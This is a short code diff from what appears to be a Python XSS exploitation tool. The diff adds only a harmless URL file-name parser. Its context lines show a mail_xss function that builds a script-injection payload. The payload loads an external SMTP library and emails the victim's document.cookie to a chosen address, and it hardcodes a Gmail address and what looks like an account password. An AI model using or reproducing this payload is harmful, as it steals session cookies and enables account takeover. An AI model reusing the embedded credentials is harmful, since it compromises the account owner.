@@ -30,3 +30,8 @@ def exploits_possible(list):
 #function to add inject the script for sending an email
 def mail_xss(mail_address):
 	return "<script src=\"https://smtpjs.com/v3/smtp.js\"></script><script>Email.send({Host : \"smtp.gmail.com\",Username : \"davide.sbetti@gmail.com\",Password : \"hiellzxiajvmuimz\",To : '" + mail_address + "',From : \"davide.sbetti@gmail.com\",Subject : \"a\",Body : document.cookie });</script>"
+
+#parse the complete url to extract only the file name
+def file_parse(file):
+	index = file.rfind('/')
+	return file[(index+1):]
